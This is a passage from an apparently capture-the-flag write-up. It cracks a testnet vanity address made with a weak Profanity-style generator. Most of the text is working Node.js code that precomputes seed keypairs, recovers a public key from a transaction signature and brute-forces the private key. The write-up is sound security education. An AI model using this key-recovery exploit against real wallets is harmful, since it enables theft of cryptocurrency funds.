thread 1: privKey + delta1 // | // ---- thread 2: privKey + delta2 const seedKey = zeroPad(arrayify(privateKey.add(delta).mod(CURVE.n)), 32); const thread = new Worker(\"./find-dead.js\", { workerData: { seedKey: seedKey }, }); thread.on(\"message\", (msg) =\u003e { console.log(msg); }); } Then in each thread we have the following script: find-dead.js\nconst { BigNumber } = require(\"ethers\"); const { getAddress: checksumAddress, hexDataSlice, keccak256, } = require(\"ethers/lib/utils\"); const { Point } = require(\"@noble/secp256k1\"); const { parentPort, workerData } = require(\"worker_threads\"); // Calculate new point `P` from seed key `p` const seedKey = workerData.seedKey; let newPoint = Point.fromPrivateKey(seedKey); // seed pub key for (let i = 1; ; i++) { // Increment new point `P` (i.e. `P \u003c- P + G`) newPoint = newPoint.add(Point.BASE); // part of the set of the candidate pub key // Infer address of `P` const newAddress = hexDataSlice( keccak256(hexDataSlice(\"0x\" + newPoint.toHex(), 1)), 12, ); // If address is vanity address... if (newAddress.startsWith(\"0x0dead\")) { // Infer the private key (i.e. `p + i`) const deadKey = BigNumber.from(seedKey).add(i); // Send back to parent process to print parentPort.postMessage( `\\nPrivate Key: ${deadKey.toHexString()}\\ \\nAddress: ${checksumAddress(newAddress)}`, ); } } We can notice that there are no more than MAX_UINT16 per thread (3 threads) private key possible, which is a reasonable amount number of private to generate.\nOnce we have all the possible private keys it‚Äôs not more difficult to generate all the public key associated (aka seed public key).\nHere is a script to generate all possible public key seeds:\nconst fs = require(\"node:fs\"); const { BigNumber } = require(\"ethers\"); const { arrayify, keccak256, zeroPad } = require(\"ethers/lib/utils\"); const { Point } = require(\"@noble/secp256k1\"); const { CURVE } = require(\"@noble/secp256k1\"); const MAX_UINT16 = 65535; const K = \"0xc01ddeadc01ddeadc01ddead\"; const d0 = BigNumber.from(K).mul(0); const d1 = BigNumber.from(K).mul(1); const d2 = BigNumber.from(K).mul(2); // let map = new Map(); // Generates all possible private keys (65535 * 3 = 196 605) for (let i = 0; i \u003c MAX_UINT16; i++) { const privateKey = BigNumber.from(keccak256(i)); const pvKey0 = zeroPad(arrayify(privateKey.add(d0).mod(CURVE.n)), 32); const pvKey1 = zeroPad(arrayify(privateKey.add(d1).mod(CURVE.n)), 32); const pvKey2 = zeroPad(arrayify(privateKey.add(d2).mod(CURVE.n)), 32); // const content = `${s0}\\n${s1}\\n${s2}\\n`; const seedPbKey0 = Point.fromPrivateKey(new Uint8Array(pvKey0)); const seedPbKey1 = Point.fromPrivateKey(new Uint8Array(pvKey1)); const seedPbKey2 = Point.fromPrivateKey(new Uint8Array(pvKey2)); const content = `\"${seedPbKey0.toHex()}\": [${pvKey0}],\\n\"${seedPbKey1.toHex()}\": [${pvKey1}],\\n\"${seedPbKey2.toHex()}\": [${pvKey2}],\\n`; fs.appendFileSync(\"./out.log\", content, () =\u003e {}); } Once the keys are generated we can put then into a file. My idea was to generate a mapping such that : pubKey ‚áí privKey\nSo that if we manage to find the seed public key of the vanity address of LADY_WHITEFROST it‚Äôs very easy to get the associated private key and so we break the level !\nOnce the script has finished to run we end up with a ~50Mb file that contains all the mapped keys, then we can convert the file to a js object so it will be easier to load it into memory: map.js\nconst data = { \"04b793ec11629accadfd51835c82654391fad3f7489af36440155403e366dc677808fa587ed7576c1274e4fcdf886789b72b52de5e1eed3907500d9d4d3f8aa1fb\": [ 188, 54, 120, 158, 122, 30, 40, 20, 54, 70, 66, 41, 130, 143, 129, 125, 102, 18, 247, 180, 119, 214, 101, 145, 255, 150, 169, 224, 100, 188, 201, 138, ], \"046d7e35af8d3626c3b9a4846f7a3eb7bb4da9b33dc29dbd1c0254f9ea4e25b7d64753c9655cbcd5974904b0dd51a0b5fb11a7dbd676031706472c8d794800abe0\": [ 188, 54, 120, 158, 122, 30, 40, 20, 54, 70, 66, 41, 130, 143, 129, 125, 102, 18, 247, 181, 55, 244, 68, 63, 191, 180, 136, 142, 36, 218, 168, 55, ], // ... // ... // ... }; module.exports = { data }; Now that we are done with this part we can go back to the address:\nLADY_WHITEFROST = 0x0DEaD582fa84de81e5287132d70d9a296224Cf90; We have to recover a public key from the address. The process implies that we use a transaction made by the said address. We can do that looking on Etherscan and I chose the following one:\n0xf81d53b9d2fa44bb0c31913b55eeabf38492d187fc2fe162a6359850c2320b97 which has the followin associated encoded data (click on Get Raw Tx Hex on the etherscan more button of the transaction):\nFrom here we have to retrieve the r,s,v value, we can use ABDK TollKit to do that from web interface:\nAfter, that I used the following script to recover the public from the transaction details: ransactionToPublicKey.js\nconst { ethers } = require(\"ethers\"); async function recover(tx) { const expandedSig = { r: tx.r, s: tx.s, v: tx.v, }; const signature = ethers.utils.joinSignature(expandedSig); const txData = { gasLimit: tx.gasLimit, value: tx.value, nonce: tx.nonce, data: tx.data, chainId: tx.chainId, to: tx.to, // you might need to include this if it's a regular tx and not simply a contract deployment type: tx.type, maxFeePerGas: tx.maxFeePerGas, maxPriorityFeePerGas: tx.maxPriorityFeePerGas, }; const rsTx = await ethers.utils.resolveProperties(txData); const raw = ethers.utils.serializeTransaction(rsTx); // returns RLP encoded tx const msgHash = ethers.utils.keccak256(raw); // as specified by ECDSA const msgBytes = ethers.utils.arrayify(msgHash); // create binary hash return { publicKey: ethers.utils.recoverPublicKey(msgBytes, signature), address: ethers.utils.recoverAddress(msgBytes, signature), }; } recover({ r: \"0x14ad83bdfc9bb697562faf6fd876b3fcda0e08bfc91589ad7e140d6e6f7f2138\", s: \"0x36c1ad13b175a65fc23749d201fa382b5169e4f0ca0bbc041140077e19e4c803\", v: \"0xf81d53b9d2fa44bb0c31913b55eeabf38492d187fc2fe162a6359850c2320b97\", gasLimit: 21000, nonce: 0, value: 100000000000000, data: \"\", chainId: 5, to: \"0xA73dB9CFB00F43241f35d6462124C11B72C765CF\", type: 2, maxFeePerGas: 5870556900, maxPriorityFeePerGas: 1500000000, }).then((res) =\u003e console.log(res)); which gave me the following output :\nLet‚Äôs go ! We have the public key of LADY_WHITEFROST, the only thing left to do is bruteforcing the public key so that we can retrieve the seed public key which will gave us the associated private key thanks to our mapping.\nHere is the bruteforce attack script:\nconst { BigNumber } = require(\"ethers\"); const { Point } = require(\"@noble/secp256k1\"); const { getAddress: checksumAddress, hexDataSlice, keccak256, } = require(\"ethers/lib/utils\"); console.log(\"Loading pub/priv key pairs into memory...\"); const { data: map } = require(\"./map.js\"); console.log(\"Data keys has been loaded\"); // We start from the public key we found let newPoint = Point.fromHex( \"04077029792b56144069fac2787ca35fad37f7f0634236ba02e307bff5a2f120e1c1484a687dc468e671eef339d1437d02d51949973ccfd29f33efe9aa4b9a6017\", ); for (let i = 1; ; i++) { // Then we do the opposite operation made to find the Vanity address (add -\u003e substract) newPoint = newPoint.subtract(Point.BASE); const hexNewPoint = newPoint.toHex(); // if the public key exist in the db then it's the public key seed used // to generate the vanity public key! if (map[hexNewPoint] !== undefined) { const seedKey = new Uint8Array(map[hexNewPoint]); console.log(seedKey); const deadKey = BigNumber.from(seedKey).add(i); // We print out the private key found console.log( `i = ${i}\\nPrivate Key: ${deadKey.toHexString()}\\nPublic key: ${hexNewPoint}`, ); break; } } Here we have it!\nUsefull links:\nA vulnerability disclosed in Profanity, an Ethereum vanity address tool Private key safety It took the wintermute hacker 5 days to brute force an ETH Vanity Address‚Ä¶ Profanity-brute-force The Profanity Address Hack ‚Äî How are Vanity Addresses Generated? https://vast.ai/ A Deep Dive of HOW Profanity Caused Wintermute to Lose $160M Get public key of any ethereum account ECDSA: Elliptic Curve Signatures How to get sender‚Äôs Ethereum address and public key from signed transaction ethers.js Recover public key from contract deployment via v,r,s values Can we generate public key from ethereum public address? Some screen shot from my research during the quest:\nTx = 0x02f87105808459682f0085015de996e482520894a73db9cfb00f43241f35d6462124c11b72c765cf865af3107a400080c001a014ad83bdfc9bb697562faf6fd876b3fcda0e08bfc91589ad7e140d6e6f7f2138a036c1ad13b175a65fc23749d201fa382b5169e4f0ca0bbc041140077e19e4c803 From = 0x0DEaD582fa84de81e5287132d70d9a296224Cf90 To = 0xA73dB9CFB00F43241f35d6462124C11B72C765CF r = 0x14ad83bdfc9bb697562faf6fd876b3fcda0e08bfc91589ad7e140d6e6f7f2138 s = 0x36c1ad13b175a65fc23749d201fa382b5169e4f0ca0bbc041140077e19e4c803 v = 0xf81d53b9d2fa44bb0c31913b55eeabf38492d187fc2fe162a6359850c2320b97 "},"title":"Wintermute Rekt"}}